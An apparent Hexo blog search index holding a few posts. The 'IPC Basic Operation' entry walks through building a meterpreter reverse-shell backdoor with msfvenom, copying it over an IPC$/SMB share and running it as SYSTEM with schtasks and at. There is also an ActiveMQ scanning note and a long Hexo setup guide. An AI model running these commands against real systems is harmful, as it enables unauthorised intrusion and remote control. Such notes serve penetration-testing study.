href="https://segmentfault.com/a/1190000000423141">结对编程利器：SSH和Tmux</a>]</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IPC Basic Operation</title>
      <link href="Kali/PostExploit/IPC-Basic-Operation.html"/>
      <url>Kali/PostExploit/IPC-Basic-Operation.html</url>
      
        <content type="html"><![CDATA[<h2 id="IPC-Internet-Process-Connection-是共享”命名管道”的资源。"><a href="#IPC-Internet-Process-Connection-是共享”命名管道”的资源。" class="headerlink" title="IPC$(Internet Process Connection)是共享”命名管道”的资源。"></a>IPC$(Internet Process Connection)是共享”命名管道”的资源。</h2><p>它是为了让进程间通信而开放的命名管道，<br>通过提供可信任的用户名和口令，<br>连接双方可以建立安全的通道并以此通道进行加密数据的交换，<br>从而实现对远程计算机的访问。</p><p>使用条件：</p><ul><li>开放了139、445端口；</li><li>目标开启ipc$文件共享；</li><li>获取用户账号密码。</li></ul><h3 id="msfvenom生成后门"><a href="#msfvenom生成后门" class="headerlink" title="msfvenom生成后门"></a>msfvenom生成后门</h3><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.79.207 LPORT=4444 -f exe &gt; ./test.exe</code></pre><h3 id="与目标建立ipc-连接"><a href="#与目标建立ipc-连接" class="headerlink" title="与目标建立ipc$连接"></a>与目标建立ipc$连接</h3><pre><code class="zsh">#建立ipc连接net use \\10.211.55.9\ipc$ /u:adminstrator &lt;password&gt;#查看已建立的连接net use#挂载目标c盘到本地，盘符为znet use z:  \\10.211.55.9\c$   #查看目标网路共享的资源net view \\10.211.55.9</code></pre><h3 id="拷贝test-exe到目标网络"><a href="#拷贝test-exe到目标网络" class="headerlink" title="拷贝test.exe到目标网络"></a>拷贝test.exe到目标网络</h3><pre><code>#拷贝本地文件到目标C:\windows\temp\中copy test.exe \\10.211.55.9\c$\windows\temp\#下载目录C:\windows\temp\hash.txt文件到本地copy \\10.211.55.9\c$\windows\temp\aaa.txt</code></pre><h3 id="4-启用计划任务执行"><a href="#4-启用计划任务执行" class="headerlink" title="4.启用计划任务执行"></a>4.启用计划任务执行</h3><h5 id="使用schtasks-exe命令"><a href="#使用schtasks-exe命令" class="headerlink" title="使用schtasks.exe命令"></a>使用schtasks.exe命令</h5><pre><code>#在目标上创建计划任务task_name1schtasks /create /tn task_name1 /s 10.211.55.9  /u administrator /p &lt;password&gt; /tr c:\windows\temp\test.exe /sc onstart /ru system#执行目标上的计划任务task_name1schtasks /run /s 10.211.55.9 /u administrator /p &lt;password&gt; /tn task_name1# 创建该时间之后的某个时刻自动执行任务，任务名 plugin_updateschtasks /create /tn &quot;plugin_update&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st 16:32 /S 193.168.1.12 /RU System /u administrator /p &quot;1qaz@WSX&quot;#删除目标上的计划任务task_name1schtasks /delete /s 10.211.55.9 /u administrator /p &lt;password&gt;  /tn task_name1  /f</code></pre><h5 id="使用at命令"><a href="#使用at命令" class="headerlink" title="使用at命令"></a>使用at命令</h5><pre><code>#查看目标上的时间net time \\10.211.55.9#设定目标上的定时执行的任务at \\10.211.55.9 13:54 c:\windows\temptest.exe#删除目标上的定时任务at \\10.211.55.9at \\10.211.55.9 &lt;id&gt; /del</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> PostExploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ActiveMQ</title>
      <link href="Kali/Exploit/ActiveMQ.html"/>
      <url>Kali/Exploit/ActiveMQ.html</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p>ActiveMQ是Apache使用纯Java语言编写的开源消息中间件,</p><p><a href="https://juejin.cn/post/6844903920209231886">https://juejin.cn/post/6844903920209231886</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code>╭─ethan@ethan.local ~╰─➤  nmap  10.184.67.63 -sV -Pn -T4  -p 61616Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-04 17:00 CSTNmap scan report for 10.184.67.63Host is up (0.047s latency).PORT      STATE SERVICE  VERSION61616/tcp open  apachemq ActiveMQ OpenWire transport 5.14.0 (Java 1.8.0_172; arch: amd64)Service Info: OS: Linux 3.10.0; CPE: cpe:/o:linux:linux_kernel:3.10.0Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds</code></pre><h2 id="Apache-ActiveMQ-Information-Leak-CVE-2017-15709"><a href="#Apache-ActiveMQ-Information-Leak-CVE-2017-15709" class="headerlink" title="Apache ActiveMQ Information Leak-[CVE-2017-15709]"></a>Apache ActiveMQ Information Leak-[CVE-2017-15709]</h2><p>Apache ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息,会返回应用名称，JVM，操作系统以及内核版本等信息。</p><h3 id="telnet测试"><a href="#telnet测试" class="headerlink" title="telnet测试"></a><code>telnet</code>测试</h3><pre><code>telnet 10.184.67.53 61616</code></pre><h3 id="MSF相关漏洞模块"><a href="#MSF相关漏洞模块" class="headerlink" title="MSF相关漏洞模块"></a>MSF相关漏洞模块</h3><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pythonic_tools</title>
      <link href="Coding/Python/pythonic-tools.html"/>
      <url>Coding/Python/pythonic-tools.html</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="通过pymusic-dl下载音乐"><a href="#通过pymusic-dl下载音乐" class="headerlink" title="通过pymusic-dl下载音乐"></a>通过pymusic-dl下载音乐</h2><pre><code class="zsh">pip install pymusic-dl  # 安装音乐模块music-dl -k &quot;&lt;音乐名&gt;&quot;   # 下载音乐</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="通过you-get下载视频"><a href="#通过you-get下载视频" class="headerlink" title="通过you-get下载视频"></a>通过you-get下载视频</h3><pre><code class="zsh">pip3 install you-getpython3 -m pip install --upgrade you-getyou-get &quot;url&quot;  # 下载url内的视频</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Built Mr.Frame with Hexo and Git</title>
      <link href="Evolution/Built-Mr-Frame-with-Hexo-and-Git.html"/>
      <url>Evolution/Built-Mr-Frame-with-Hexo-and-Git.html</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p>推荐博文：</p><ul><li><a href="https://mp.weixin.qq.com/s/J4ghw2iWQTKoNynF3gIcPQ">https://mp.weixin.qq.com/s/J4ghw2iWQTKoNynF3gIcPQ</a></li><li><a href="https://www.shangyang.me/2016/12/16/hexo-base-concept/">https://www.shangyang.me/2016/12/16/hexo-base-concept/</a></li><li><a href="https://segmentfault.com/a/1190000021614307">https://segmentfault.com/a/1190000021614307</a></li><li><a href="https://juejin.cn/post/6844903805859921933">https://juejin.cn/post/6844903805859921933</a></li></ul><p><img src="../images/hexo-1.jpg" alt="hexo-1"></p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p><a href="https://hexo.io/docs/">hexo</a> 是一个快速、简洁且高效的博客框架。</p><h3 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h3><pre><code class="zsh">brew install git node  # 安装git 和nodenpm config set registry https://registry.npm.taobao.org # 配置npm源npm install -g hexo-cli  # 安装hexoproxychains4 hexo  init Mr-Framework   # 初始化博客git clone https://github.com/yelog/hexo-theme-3-hexo.git themes/3-hexo   # 下载3-hexo主题</code></pre><h3 id="Hexo目录结构"><a href="#Hexo目录结构" class="headerlink" title="Hexo目录结构"></a>Hexo目录结构</h3><pre><code class="yml">Mr-Framework├── _config.yml        // 网站配置文件├── node_modules    // npm依赖模块目录├── package-lock.json    // node项目配置文件├── package.json    // node项目配置文件├── scaffolds            // 新建mardown文件模板目录│   ├── draft.md                    │   ├── page.md                        │   └── post.md                        ├── source        // 存放makrdown文件和图片│   └── _posts│       └── hello-world.md  //hexo默认markdown文件└── themes                                //hexo主题目录    └── 3-hexo    ├── LICENSE    ├── README.md    ├── _config.yml                //主题配置文件    ├── languages                    //语言支持插件    │   ├── en.yml    │   └── zh-CN.yml    ├── layout                        //布局文件    │   ├── _partial    │   ├── index.ejs    │   ├── indexs.md    │   └── post.ejs    └── source                    //主题源代码        ├── css        ├── img        └── js</code></pre><h3 id="Hexo配置文件"><a href="#Hexo配置文件" class="headerlink" title="Hexo配置文件"></a>Hexo配置文件</h3><pre><code class="yml"># Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Sitetitle: Mr.Framework   #网站标题subtitle: &#39;subtitle&#39;   #网站副标题description: &#39;&#39;      #网站描述,主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词keywords:       #网站的关键词,支持多个author: askDing    #作者language: en       #网站使用的语言timezone: &#39;Asia/Shanghai&#39;      #时区，# URL## If your site is put in a subdirectory, set url as &#39;http://example.com/child&#39; and root as &#39;/child/&#39;url: https://askding.github.ioroot: /     # 网站根目录存放位置permalink: :category/:title.html   # 文章中的永久链接格式permalink_defaults:   # 永久链接中的默认设置pretty_urls:  trailing_index: true # Set to false to remove trailing &#39;index.html&#39; from permalinks  trailing_html: true # Set to false to remove trailing &#39;.html&#39; from permalinks# Directorysource_dir: source   # 资源文件夹，存放内容的public_dir: public    # 公共文件夹，用于存放生成的站点文件tag_dir: tags        # 标签文件夹archive_dir: archives    # 归档文件夹category_dir: categories  # 分类文件夹code_dir: downloads/code  # source_dir下的子目录,存放代码用的i18n_dir: :lang      # 国际化文件夹skip_render:       # 跳过指定文件的渲染，匹配到文件将直接复制到public目录中# Writingnew_post_name: :year-:month-:day-:title.md # File name of new postsdefault_layout: pagetitlecase: false # Transform title into titlecaseexternal_link:  enable: true # Open external links in new tab  field: site # Apply to the whole site  exclude: &#39;&#39;filename_case: 0render_drafts: falsepost_asset_folder: falserelative_link: falsefuture: truehighlight:  enable: false  line_number: true  auto_detect: false  tab_replace: &#39;&#39;  wrap: true  hljs: falseprismjs:  enable: false  preprocess: true  line_number: true  tab_replace: &#39;&#39;# Home page setting# path: Root path for your blogs index page. (default = &#39;&#39;)# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator:  path: &#39;&#39;  per_page: 10  order_by: -date# Category &amp; Tagdefault_category: askDingcategory_map:tag_map:search:      # 文章搜索   path: search.xml   field: _post# Metadata elements## https://developer.mozilla.org/en-US/docs/Web/HTML/Element/metameta_generator: true# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss## updated_option supports &#39;mtime&#39;, &#39;date&#39;, &#39;empty&#39;updated_option: &#39;date&#39;# Pagination## Set per_page to 0 to disable paginationper_page: 10pagination_dir: page# Include / Exclude file(s)## include:/exclude: options only apply to the &#39;source/&#39; folderinclude:exclude:ignore:# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: 3-hexo## Plugins: http://hexo.io/plugins/#RSS订阅和sitemapplugin:  - hexo-generator-feed  - hexo-generator-feed  - hexo-generator-sitemap#Feed Atomfeed:type: atompath: atom.xmllimit: 20# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:  type: &#39;git&#39;  repository: https://github.com/askDing/askDing.github.io.git  branch: master</code></pre><h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><p>hexo的主题仓库<a href="https://hexo.io/themes/">点击此处</a></p><p>推荐的博客主题 **<a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo</a>**、<a href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a> 、 <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack">freemind.bithack</a>        </p><blockquote><p>Mr-Framework/themes/3-hexo/_config.yml</p></blockquote><!--1. 代码块位置：source/css/_partial/post.styl:2292.页面字体、字号大屏字体：字体位置：source/css/style.styl:8字号位置：source/css/_partial/post.styl:3中屏字体：字体位置：source/css/mobile.styl:3字号位置：source/css/mobile.styl:17手机字体：字号位置：source/css/mobile.styl:146--><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><h4 id="UI颜色配置"><a href="#UI颜色配置" class="headerlink" title="UI颜色配置"></a>UI颜色配置</h4><blockquote><p>Mr-Framework/themes/3-hexo/source/css/_partial/nav-right.styl</p></blockquote><pre><code class="css">.nav-right  width 420px  height 100%  background #F2F1D7    /* 柔黄色 */  border-right 1px solid #e5e8ec  overflow hidden  float left  position relative  -webkit-user-select none  -moz-user-select none  -ms-user-select none  -o-user-select none  user-select none</code></pre><blockquote><p> Mr-Framework/themes/3-hexo/source/css/_partial/post.styl</p></blockquote><pre><code class="css">#post  height 100%  font-weight: 350;  font-size: 14px;  line-height 1.55  background #E8FFE8    /* 浅绿色  */  overflow-x hidden  overflow-y auto  -webkit-overflow-scrolling touch  font-family -apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif  color #2f2f2f  margin-left 1px   article      padding 1em    /* 内容间隔1em */      background #E8FFE8      .article-entry&gt;p:nth-child(1)        margin-top 20px   .copyright    margin-top 50px    padding-bottom 30px    background #E8FFE8    /* 版权浅绿色 */    line-height 14px    text-align center    color #BCC1C4</code></pre><h4 id="Gitalk评论背景颜色"><a href="#Gitalk评论背景颜色" class="headerlink" title="Gitalk评论背景颜色"></a>Gitalk评论背景颜色</h4><blockquote><p>/Mr-Framework/themes/3-hexo/source/css/_partial/comment.styl</p></blockquote><pre><code class="css">#comments  padding 2.5em  background #e8ffe8   /* 评论区背景颜色   */  .comment-bar    display block    cursor pointer    background rgba(255,255,255,0.3)    padding 0.5rem    -webkit-box-shadow 3px 2px 8px rgba(0,0,0,0.07)    box-shadow 3px 2px 8px rgba(0,0,0,0.07)    text-align center    font-size 2rem</code></pre><h4 id="头像配置"><a href="#头像配置" class="headerlink" title="头像配置"></a>头像配置</h4><blockquote><p>图片存放在 Mr-Framework/themes/3-hexo/source/img/</p></blockquote><pre><code class="yml">avatar: /img/avatar.pngfavicon: /img/avatar.png</code></pre><h4 id="联系链接配置"><a href="#联系链接配置" class="headerlink" title="联系链接配置"></a>联系链接配置</h4><pre><code class="yml">ink:  theme: color # 链接样式，color: 彩色图标  white: 黑白图标  items:    rss: /atom.xml    github: https://github.com/askDing    email: askding@qq.com    qq: 741474596</code></pre><h4 id="文章分类设置"><a href="#文章分类设置" class="headerlink" title="文章分类设置"></a>文章分类设置</h4><pre><code class="yml">category:  num: true # 分类显示文章数  sub: true # 开启多级分类  sort:    - Cyber Security    - aaa    - bb</code></pre><h4 id="左下角自定义菜单"><a href="#左下角自定义菜单" class="headerlink" title="左下角自定义菜单"></a>左下角自定义菜单</h4><pre><code class="yml">menu:  about:  # &#39;关于&#39; 按钮    on: true # 是否显示    url: /about  # 跳转链接    type: 1 # 跳转类型 1：站内异步跳转 2：当前页面跳转 3：打开新的tab页  friend: # &#39;友链&#39; 按钮    on: true # 是否展示  menus: # 添加的其他菜单写在 menus 下，如下三个菜单：动态菜单1、动态菜单2、动态菜单3    相册:      on: false      url: /photo      type: 1  # 跳转类型 1：站内异步跳转    叶落阁:      on: false      url: http://yelog.org/      type: 2  # 跳转类型 2：当前页面跳转    github:      on: false      url: https://github.com/yelog      type: 3  # 跳转类型 3：打开新的tab页</code></pre><h4 id="文末声明"><a href="#文末声明" class="headerlink" title="文末声明"></a>文末声明</h4><pre><code class="yml"># 文末声明article_txt: 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.combottom_text: ©1996-2020 Mr.Framework# 自定义页面最下方的站点版权信息# 如果不填，则自定义为 ©2017 author (这个author为hexo根目录_config.yml中配置的)# 底部备案号miit:  on: false  info: 京ICP证030173号  url: http://beian.miit.gov.cn/ # 默认链接为 http://beian.miit.gov.cn/</code></pre><h4 id="左侧导航宽度"><a href="#左侧导航宽度" class="headerlink" title="左侧导航宽度"></a>左侧导航宽度</h4><blockquote><p>Mr-Framework/themes/3-hexo/source/css/_partial/nav-left.styl</p></blockquote><pre><code class="css">.nav-left  width 130px    /* 左侧导航宽度 130px */  height 100%  background #2A2935  box-shadow inset -15px 0 15px -15px #222  float left  position relative  -webkit-user-select none  -moz-user-select none  -ms-user-select none  -o-user-select none  user-select none</code></pre><h4 id="不蒜子网站计数配置"><a href="#不蒜子网站计数配置" class="headerlink" title="不蒜子网站计数配置"></a>不蒜子网站计数配置</h4><pre><code class="yml"># 不蒜子网站计数设置# http://ibruce.info/2015/04/04/busuanzi/visit_counter:  on: true  site_visit: true  page_visit: true</code></pre><h4 id="代码高亮配置"><a href="#代码高亮配置" class="headerlink" title="代码高亮配置"></a>代码高亮配置</h4><ol><li>禁用网站配置文件里的代码高亮设置<blockquote><p>Mr-Framework/_config.yml</p></blockquote><pre><code class="yml">highlight:enable: false  /* 禁用代码高亮 */line_number: trueauto_detect: falsetab_replace: &#39;&#39;wrap: truehljs: false</code></pre></li><li>启用主题配置文件里的代码高亮<blockquote><p>Mr-Framework/themes/3-hexo/_config.yml</p></blockquote><pre><code class="yml">highlight:on: true # true开启代码高亮，开启需要关闭博客 _config.yml 中的 highlightlineNum: false # true显示行号copy: true # 复制功能theme: gruvbox-dark</code></pre></li></ol><h3 id="高级配置"><a href="#高级配置" class="headerlink" title="高级配置"></a>高级配置</h3><h4 id="MathJax数学公式"><a href="#MathJax数学公式" class="headerlink" title="MathJax数学公式"></a>MathJax数学公式</h4><p>修改 <code>_config.yml</code></p><pre><code class="yml"># MathJax 数学公式支持mathjax:  on: true #是否启用  per_page: false # 若只渲染单个页面，此选项设为false，页面内加入 mathjax: trueyaml复制代码</code></pre><p>考虑到页面的加载速度，支持渲染单个页面。<br>设置 <code>per_page: false</code> ,在需要渲染的页面内 加入 <code>mathjax: true</code></p><blockquote><p><strong><code>注意:</code></strong><br>由于hexo的MarkDown渲染器与MathJax有冲突，可能会造成矩阵等使用不正常。所以在使用之前需要修改两个地方<br>编辑 <code>node_modules\marked\lib\marked.js</code> 脚本</p></blockquote><ol><li>将451行 ，这一步取消了对 <code>\\,\&#123;,\&#125;</code> 的转义(escape)</li></ol><pre><code class="js">escape: /^\\([\\`*&#123;&#125;\[\]()# +\-.!_&gt;])/,改为escape: /^\\([`*\[\]()# +\-.!_&gt;])/,</code></pre><ol start="2"><li>将459行，这一步取消了对斜体标记 <code>_</code>的转义</li></ol><pre><code class="js">em: /^\b_((?:[^_]|__)+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,改为em:/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</code></pre><h4 id="添加Mermaid图标"><a href="#添加Mermaid图标" class="headerlink" title="添加Mermaid图标"></a>添加Mermaid图标</h4><pre><code class="zsh">##&gt;&gt;&gt;&gt;&gt;&gt;&gt;在网站配置文件中Mr-Framework/_config.yml添加如下内容 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;#### Mermaid 支持mermaid:  on: true  cdn: //cdn.jsdelivr.net/npm/mermaid@8.4.2/dist/mermaid.min.js  #cdn: //cdnjs.cloudflare.com/ajax/libs/mermaid/8.3.1/mermaid.min.js  options: # 更多配置信息可以参考 https://mermaidjs.github.io/#/mermaidAPI    theme: &#39;default&#39;    startOnLoad: true    flowchart: true      useMaxWidth: false      htmlLabels: true##&gt;&gt;&gt;&gt;&gt;&gt;&gt;命令行安装hexo-filter-mermaid-diagrams插件 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;###npm install hexo-filter-mermaid-diagrams</code></pre><h4 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h4><pre><code class="zsh">word_count: false# true 开启字数统计# 开启此功能需要安装插件 ：在 hexo根目录 执行npm install hexo-wordcount </code></pre><h4 id="配置思维导图"><a href="#配置思维导图" class="headerlink" title="配置思维导图"></a>配置思维导图</h4><pre><code class="zsh">npm install hexo-simple-mindmap  # 安装思维导图插件在markdown中按照如下格式输写&#123;% pullquote mindmap mindmap-md %&#125;- [在 Hexo 中使用思维导图](https://hunterx.xyz/use-mindmap-in-hexo.html)  - 前言  - 操作指南    - 准备需要的文件    - 为主题添加 CSS/JS 文件  - 使用方法&#123;% endpullquote %&#125;</code></pre><h4 id="全文搜索"><a href="#全文搜索" class="headerlink" title="全文搜索"></a>全文搜索</h4><pre><code class="zsh">searchAll: ture# true 启用全文搜索# 开启此功能需要下面操作：# 1. 在 hexo 根目录 执行 npm install hexo-generator-search --save 安装插件# 2. 在 hexo 根目录的 _config.xml 中添加下面内容# search:#   path: search.xml#   field: postnpm install hexo-generator-search</code></pre><h4 id="添加RSS和Sitemap"><a href="#添加RSS和Sitemap" class="headerlink" title="添加RSS和Sitemap"></a>添加RSS和Sitemap</h4><pre><code class="yml">##&gt;&gt;&gt;&gt;&gt;&gt;&gt;在网站配置文件中Mr-Framework/_config.yml添加如下内容 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;##### Plugins: http://hexo.io/plugins/#RSS订阅和sitemapplugin:  - hexo-generator-feed  - hexo-generator-sitemap#Feed Atomfeed:type: atompath: atom.xmllimit: 20##### 在主题配置文件中Mr-Framework/themes/3-hexo/_config.yml添加如下内容 &lt;&lt;&lt;&lt;&lt;&lt;&lt;######link:  theme: color # 链接样式，color: 彩色图标  white: 黑白图标  items:    rss: /atom.xml</code></pre><pre><code class="zsh">npm install hexo-generator-feed hexo-generator-sitemap </code></pre><p>提交sitemap到<a href="https://developers.google.com/search">Google站点平台</a></p><p><img src="../images/hexo-2.png" alt="hexo-2"></p><p>下载这个html文件，到网站仓库上传这个html文件点击<strong>VERIFY</strong></p><p><img src="../images/hexo-3.png" alt="hexo-3"></p><p>添加站点文件sitemap.xml </p><p><img src="../images/hexo-4.png" alt="hexo-4"></p><h4 id="添加建站时间"><a href="#添加建站时间" class="headerlink" title="添加建站时间"></a>添加建站时间</h4><pre><code class="js">&lt;!-- 添加建站时间代码到Mr-Framework/themes/3-hexo/layout/_partial/footer.ejs文件末尾 --&gt;&lt;script language=javascript&gt;    function siteTime() &#123;        window.setTimeout(&quot;siteTime()&quot;, 1000);        var seconds = 1000;        var minutes = seconds * 60;        var hours = minutes * 60;        var days = hours * 24;        var years = days * 365;        var today = new Date();        var todayYear = today.getFullYear();        var todayMonth = today.getMonth() + 1;        var todayDate = today.getDate();        var todayHour = today.getHours();        var todayMinute = today.getMinutes();        var todaySecond = today.getSeconds();        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)        year - 作为date对象的年份，为4位年份值        month - 0-11之间的整数，做为date对象的月份        day - 1-31之间的整数，做为date对象的天数        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数        minutes - 0-59之间的整数，做为date对象的分钟数        seconds - 0-59之间的整数，做为date对象的秒数        microseconds - 0-999之间的整数，做为date对象的毫秒数 */        var t1 = Date.UTC(2020, 12, 05, 00, 00, 00); //北京时间2020-12-05 00:00:00        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);        var diff = t2 - t1;        var diffYears = Math.floor(diff / years);        var diffDays = Math.floor((diff / days) - diffYears * 365);        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);        document.getElementById(&quot;sitetime&quot;).innerHTML = &quot;本站已运行 &quot; +diffYears+&quot; 年 &quot;+diffDays + &quot; 天 &quot; + diffHours + &quot; 小时 &quot; + diffMinutes + &quot; 分钟 &quot; + diffSeconds + &quot; 秒&quot;;    &#125;/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/    siteTime();&lt;/script&gt;</code></pre><p>然后在合适的地方（比如copyright声明后面）加上下面的代码就行了：</p><blockquote><p>Mr-Framework/themes/3-hexo/layout/indexs.md文件中添加如下代码</p></blockquote><pre><code class="html">&lt;span id=&quot;sitetime&quot;&gt;&lt;/span&gt;</code></pre><h4 id="添加百度统计和谷歌统计代码-不适用"><a href="#添加百度统计和谷歌统计代码-不适用" class="headerlink" title="添加百度统计和谷歌统计代码-不适用"></a>添加百度统计和谷歌统计代码-不适用</h4><p>打开<code>themes/matery/layout/_partial/head.ejs</code>，修改下面两行：</p><pre><code class="html">&lt;meta name=&quot;baidu-site-verification&quot; content=&quot;fmlEuI34ir&quot; /&gt;&lt;meta name=&quot;google-site-verification&quot; content=&quot;yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48&quot; /&gt;</code></pre><p>其中<code>content</code>内容改成你自己的就行了。</p><h4 id="图片添加水印-未适用"><a href="#图片添加水印-未适用" class="headerlink" title="图片添加水印-未适用"></a>图片添加水印-未适用</h4><p>为了防止别人抄袭你文章，可以把所有的图片都加上水印，方法很简单。</p><p>首先在博客根目录下新建一个<code>watermark.py</code>，代码如下：</p><pre><code class="python"># -*- coding: utf-8 -*-import sysimport globfrom PIL import Imagefrom PIL import ImageDrawfrom PIL import ImageFontdef watermark(post_name):    if post_name == &#39;all&#39;:        post_name = &#39;*&#39;    dir_name = &#39;source/_posts/&#39; + post_name + &#39;/*&#39;    for files in glob.glob(dir_name):        im = Image.open(files)        if len(im.getbands()) &lt; 3:            im = im.convert(&#39;RGB&#39;)            print(files)        font = ImageFont.truetype(&#39;STSONG.TTF&#39;, max(30, int(im.size[1] / 20)))        draw = ImageDraw.Draw(im)        draw.text((im.size[0] / 2, im.size[1] / 2),                  u&#39;@yourname&#39;, fill=(0, 0, 0), font=font)        im.save(files)if __name__ == &#39;__main__&#39;:    if len(sys.argv) == 2:        watermark(sys.argv[1])    else:        print(&#39;[usage] &lt;input&gt;&#39;)</code></pre><p>字体也放根目录下，自己找字体。然后每次写完一篇文章可以运行<code>python3 watermark.py postname</code>添加水印，如果第一次运行要给所有文章添加水印，可以运行<code>python3 watermark.py all</code>。</p><h4 id="404页面"><a href="#404页面" class="headerlink" title="404页面"></a>404页面</h4><ol><li>进入 Hexo 所在文件夹，输入 <code>hexo new page 404</code> ;</li><li>打开刚新建的页面文件，默认在 Hexo 文件夹根目录下 /source/404/index.md；</li><li>在顶部插入一行，写上 <code>permalink: /404</code>，这表示指定该页固定链接为 <code>http://&quot;主页&quot;/404.html</code></li></ol><pre><code>---title: 404permalink: /404date: 2016-09-27 11:31:01------## 页面未找到！</code></pre><h4 id="About-Resume页面"><a href="#About-Resume页面" class="headerlink" title="About/Resume页面"></a>About/Resume页面</h4><blockquote><p>修改主题配置文件Mr-Framework/themes/3-hexo/source/<em>config.yml</em></p></blockquote><pre><code class="yml">menu:about:  # &#39;关于&#39; 按钮 on: true # 是否显示 url: /about  # 跳转链接 type: 1 # 跳转类型 1：站内异步跳转 2：当前页面跳转 3：打开新的tab页 # 在终端内运行 hexo new page about  #在source目录下创建/source/about/index.md 编辑index.md即可</code></pre><h4 id="添加音乐插件"><a href="#添加音乐插件" class="headerlink" title="添加音乐插件"></a>添加音乐插件</h4><h5 id="生成外链代码"><a 